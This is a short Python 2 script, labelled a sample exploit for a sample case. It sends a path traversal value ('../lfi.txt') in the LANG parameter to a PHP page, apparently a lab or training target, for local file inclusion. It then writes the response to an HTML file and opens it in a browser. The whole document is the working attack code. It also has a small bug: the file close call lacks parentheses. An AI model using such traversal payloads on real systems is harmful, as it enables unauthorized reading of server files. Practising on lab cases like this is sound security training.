#sample exploit for sample case
import urllib, urllib2

url2 = 'http://bm4.com/case25.php'

exploit = '../lfi.txt'
values = dict(LANG=exploit)
data = urllib.urlencode(values)

request = urllib2.Request(url2, data)
response = urllib2.urlopen(request)

this_page = response.read()
print this_page

import webbrowser
filepath = 'exploit.html'
f = open(filepath, 'w')
f.write(this_page)
f.close

url =  filepath
webbrowser.open(url,new=2)